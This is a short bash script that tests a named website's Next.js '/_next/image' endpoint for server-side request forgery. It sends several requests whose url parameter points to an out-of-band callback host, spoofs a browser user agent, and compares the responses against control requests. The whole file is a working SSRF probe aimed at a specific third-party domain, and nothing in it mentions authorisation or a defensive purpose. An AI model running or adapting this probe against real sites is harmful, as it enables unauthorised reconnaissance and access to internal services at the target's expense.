#!/bin/bash
H='https://www.infinitycapital.bh'
UA='Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome Safari/537.36'
OOB='oob7cc475ef81d5.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in'
for p in ssrf.png ssrf.jpg ssrf "a/b.png?x=1"; do
  printf "%-16s " "$p"
  curl -sk -o /dev/null -w "code=%{http_code} size=%{size_download} ct=%{content_type}\n" \
    --get --data-urlencode "url=http://${OOB}/${p}" -d "w=1080" -d "q=75" "$H/_next/image" -A "$UA"
done
echo "--- control: unresolvable external host"
curl -sk -o /dev/null -w "code=%{http_code} size=%{size_download} ct=%{content_type}\n" \
  --get --data-urlencode "url=http://this-host-does-not-exist-zzz9.invalid/x.png" -d "w=1080" "$H/_next/image" -A "$UA"
echo "--- empty url"
curl -sk -w "\ncode=%{http_code}\n" --get --data-urlencode "url=" -d "w=1080" "$H/_next/image" -A "$UA" | head -c 200
